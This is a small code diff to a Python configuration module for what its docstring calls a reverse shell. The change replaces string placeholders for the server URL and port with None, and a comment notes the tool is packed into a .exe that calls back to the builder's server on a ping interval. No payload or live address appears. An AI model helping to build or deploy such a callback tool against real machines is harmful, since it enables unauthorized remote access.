@@ -4,8 +4,8 @@ This module contains the config for the reverse shell.
 
 # NOTE: Before building the file make sure to point this to your server URL
 #       we can't use os.getenv because it will be packed in a .exe and not ran standalone.
-SERVER_URL = "None"
-SERVER_PORT = "None"
+SERVER_URL = None
+SERVER_PORT = None
 
 # ping config
 PING_INTERVAL = 180  # seconds
